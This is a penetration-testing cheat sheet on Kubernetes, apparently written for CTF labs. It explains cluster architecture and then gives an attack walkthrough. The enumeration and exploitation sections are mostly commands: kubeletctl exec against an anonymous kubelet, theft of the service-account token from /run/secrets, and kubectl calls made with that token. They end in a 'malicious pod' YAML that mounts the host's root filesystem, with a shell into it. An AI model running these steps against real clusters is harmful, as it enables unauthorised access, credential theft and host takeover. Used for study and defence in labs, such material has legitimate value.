---
icon: dharmachakra
description: Container Orchestration Platform
---

# Kubernetes

{% hint style="info" %}
## <mark style="color:purple;">Architecture</mark>&#x20;

### <mark style="color:purple;">**Kubernetes Control Plane**</mark>

<mark style="color:purple;">The brain of the Kubernetes cluster. It makes global decisions about the cluster and monitors the state of the cluster.</mark>

* <mark style="color:orange;">**`kube-apiserver`**</mark>
  * <mark style="color:purple;">Is the central point of communication for all Kubernetes components.</mark>
  * <mark style="color:purple;">It exposes the</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Kubernetes API**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">and serves as the front-end for the Kubernetes control plane.</mark>
  * <mark style="color:purple;">All interaction go through the API server.</mark>
  * <mark style="color:purple;">It handles requests for cluster state and writes/read operations to/from</mark> <mark style="color:orange;">**`etcd`**</mark><mark style="color:purple;">.</mark>
  * <mark style="color:purple;">Handles</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**authentication, authorization, and admission control**</mark><mark style="color:purple;">.</mark>
* <mark style="color:orange;">**`etcd`**</mark>
  * <mark style="color:purple;">**I**</mark><mark style="color:purple;">s a distributed key-value store used to store all cluster data and state:</mark>
    * <mark style="color:purple;">Configuration of all resources.</mark>
    * <mark style="color:purple;">The</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**desired state**</mark><mark style="color:purple;">.</mark>
    * <mark style="color:purple;">The</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**current state**</mark><mark style="color:purple;">.</mark>
  * <mark style="color:orange;">**`etcd`**</mark> <mark style="color:purple;">ensures that the state is replicated across multiple nodes.</mark>
* <mark style="color:orange;">**`kube-controller-manager`**</mark>
  * <mark style="color:purple;">Is a daemon that runs in the control plane and manages the controllers that regulate the state of the cluster.</mark>
  * <mark style="color:orange;">**`Controllers`**</mark> <mark style="color:purple;">are responsible for ensuring the desired state of the cluster matches the current state. If there’s a mismatch, controllers take action to reconcile that state:</mark>
    * <mark style="color:purple;">For example, if a pod crashes, the</mark> <mark style="color:orange;">**`replication controller`**</mark> <mark style="color:purple;">will create a new pod to maintain the desired number of replicas.</mark>
  * <mark style="color:purple;">Some key controllers include:</mark>
    * <mark style="color:orange;">**`Deployment controller`**</mark><mark style="color:purple;">: Ensures the desired number of pod replicas are running.</mark>
    * <mark style="color:orange;">**`Node controller`**</mark><mark style="color:purple;">: Monitors nodes for health and takes actions when nodes fail.</mark>
    * <mark style="color:orange;">**`Job controller`**</mark><mark style="color:purple;">: Manages the execution of batch jobs.</mark>
* <mark style="color:orange;">**`kube-scheduler`**</mark>
  * <mark style="color:purple;">Is responsible for scheduling pods to run on the worker nodes.</mark>
  * <mark style="color:purple;">It watches for newly created pods that do not have a node assigned, and then selects the most appropriate node to run the pod based on resource requirements, node availability, and other constraints.</mark>
* <mark style="color:orange;">**`cloud-controller-manager`**</mark>
  * <mark style="color:purple;">Interacts with the cloud provider’s API to manage resources such as:</mark>
    * <mark style="color:purple;">Managing load balancers.</mark>
    * <mark style="color:purple;">Handling cloud-specific features.</mark>
  * <mark style="color:purple;">It abstracts the cloud provider-specific logic, allowing Kubernetes to be agnostic to the underlying infrastructure.</mark>

### <mark style="color:purple;">**Kubernetes Worker Node**</mark>

<mark style="color:purple;">Worker nodes are the machines (either virtual or physical) that run the actual application workloads. A Kubernetes cluster can have multiple worker nodes, and each one runs several essential components:</mark>

* <mark style="color:orange;">**`Kubelet`**</mark>
  * <mark style="color:purple;">Is an agent that runs on every worker node.</mark>
  * <mark style="color:purple;">It ensures that the containers described in the pod specs are running and healthy.</mark>
  * <mark style="color:purple;">Monitors the state of the node and the pods running on it. It communicates with the API server to report the status of the node and its workloads.</mark>
  * <mark style="color:purple;">If a pod is not running as expected, the</mark> <mark style="color:orange;">**`kubelet`**</mark> <mark style="color:purple;">can restart it.</mark>
* <mark style="color:orange;">**`Kube Proxy`**</mark>
  * <mark style="color:purple;">**I**</mark><mark style="color:purple;">s a network proxy that runs on every worker node.</mark>
  * <mark style="color:purple;">It maintains network rules for pod communication, allowing services in the cluster to be accessed reliably.</mark>
  * <mark style="color:purple;">It manages the</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**service abstraction**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">by routing traffic to the correct pods. If a service points to multiple pods,</mark> <mark style="color:orange;">**`kube-proxy`**</mark> <mark style="color:purple;">ensures the traffic is balanced between the pods using round-robin or other strategies.</mark>
* <mark style="color:orange;">**`Container Runtime`**</mark>
  * <mark style="color:purple;">Responsible for running the containers on each node. It interacts directly with the underlying infrastructure (e.g., Docker, containerd, CRI-O).</mark>
  * <mark style="color:purple;">When the</mark> <mark style="color:orange;">**`kubelet`**</mark> <mark style="color:purple;">schedules a pod, the container runtime is used to pull the container images and start the containers.</mark>
* <mark style="color:orange;">**`Pods`**</mark>
  * <mark style="color:purple;">The smallest and most basic deployable objects in Kubernetes. A pod represents one or more containers running together on the same node.</mark>
  * <mark style="color:purple;">Pods share the same network namespace, which means they can communicate with each other using</mark> <mark style="color:orange;">**`localhost`**</mark> <mark style="color:purple;">and share storage volumes.</mark>
  * <mark style="color:purple;">Typically, a pod is used to run a single container, but it can also contain multiple containers that work closely together (e.g., a main app container and a helper container like a logging agent).</mark>

***

### <mark style="color:purple;">Ports and Protocols</mark>

* <mark style="color:purple;">Read the documentation for</mark> [<mark style="color:orange;">**`Ports and Protocols`**</mark>](https://kubernetes.io/docs/reference/networking/ports-and-protocols/)
* <mark style="color:orange;">**`Port 8443`**</mark> <mark style="color:purple;">is the default starting port for the</mark> [<mark style="color:orange;">**`API server in minikube`**</mark>](https://minikube.sigs.k8s.io/docs/commands/start/)
* <mark style="color:purple;">The</mark> <mark style="color:orange;">**`kubelet`**</mark> <mark style="color:purple;">agent listens on</mark> <mark style="color:orange;">**`Port 10250`**</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Enumeration</mark>

* <mark style="color:purple;">Use</mark> [<mark style="color:orange;">**`Kubeletctl`**</mark>](https://github.com/cyberark/kubeletctl)<mark style="color:purple;">**:**</mark>

{% code title="List pods" %}
```sh
kubeletctl pods -s 10.10.11.133
```
{% endcode %}

{% code title="Running pods" overflow="wrap" %}
```sh
kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
```
{% endcode %}

* <mark style="color:orange;">**`kubelet`**</mark> <mark style="color:purple;">can allow anonymous access, where may be possible to use the commands such as</mark> <mark style="color:orange;">**`run`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`exec`**</mark><mark style="color:purple;">:</mark>

{% code title="Scan Remote Command Execution" %}
```sh
kubeletctl -s 10.129.96.98 scan rce
```
{% endcode %}

{% code title="Spawn a reverse shell" %}
```bash
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
```
{% endcode %}

* &#x20;<mark style="color:purple;">Default directories where</mark> <mark style="color:orange;">**`token`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`certificate`**</mark> <mark style="color:purple;">are stored:</mark>
  * <mark style="color:red;">**`/var/run/secrets/kubernetes.io/serviceaccount`**</mark>
  * <mark style="color:red;">**`/run/secrets/kubernetes.io/serviceaccount`**</mark>
  * <mark style="color:red;">**`/secrets/kubernetes.io/serviceaccout`**</mark>

### <mark style="color:orange;">`kubectl`</mark>

* <mark style="color:purple;">Authorize to the</mark> <mark style="color:orange;">**`API`**</mark> <mark style="color:purple;">using the</mark> <mark style="color:orange;">**`token`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`ca.crt`**</mark> <mark style="color:purple;">to be able to use it; first save the</mark> <mark style="color:orange;">**`token`**</mark> <mark style="color:purple;">as an environmental variable to make it easier to work with:</mark>&#x20;

{% code overflow="wrap" %}
```sh
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```
{% endcode %}

* <mark style="color:purple;">Copy the</mark> <mark style="color:orange;">**`ca.crt`**</mark> <mark style="color:purple;">in a file locally and start enumerating:</mark>

{% code title="Print info about the running pod" overflow="wrap" %}
```sh
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod
```
{% endcode %}

{% code title="List namespaces" overflow="wrap" %}
```sh
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces
```
{% endcode %}

{% code title="List resource services" overflow="wrap" %}
```sh
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token cluster-info
```
{% endcode %}

{% code title="List all permissions" overflow="wrap" %}
```sh
kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
### <mark style="color:purple;">Exploitation</mark>

### <mark style="color:purple;">**Create a malicious**</mark>**&#x20;**<mark style="color:orange;">**`Pod`**</mark>

<mark style="color:purple;">**It's possible to mount the host file system within a new container:**</mark>

* <mark style="color:purple;">Grab the details of the vulnerable</mark> <mark style="color:orange;">**`pod`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```sh
kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token                   
```
{% endcode %}

* <mark style="color:purple;">The key parameters needed from the file are the</mark> <mark style="color:orange;">**`namespace`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`image`**</mark><mark style="color:purple;">,</mark> <mark style="color:purple;">add those to this template:</mark>

{% code overflow="wrap" %}
```yaml
apiVersion: v1 
kind: Pod
metadata:
  name: tokyo-pod
  namespace: CHANGE ME
spec:
  containers:
  - name: tokyo-pod
    image: CHANGE ME
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
{% endcode %}

* <mark style="color:purple;">Now start the</mark> <mark style="color:orange;">**`pod`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```sh
kubectl apply -f evil-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
```
{% endcode %}

* <mark style="color:purple;">And get a reverse shell back:</mark>

{% code overflow="wrap" %}
```sh
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p tokyo-pod -c tokyo-pod
```
{% endcode %}
{% endhint %}
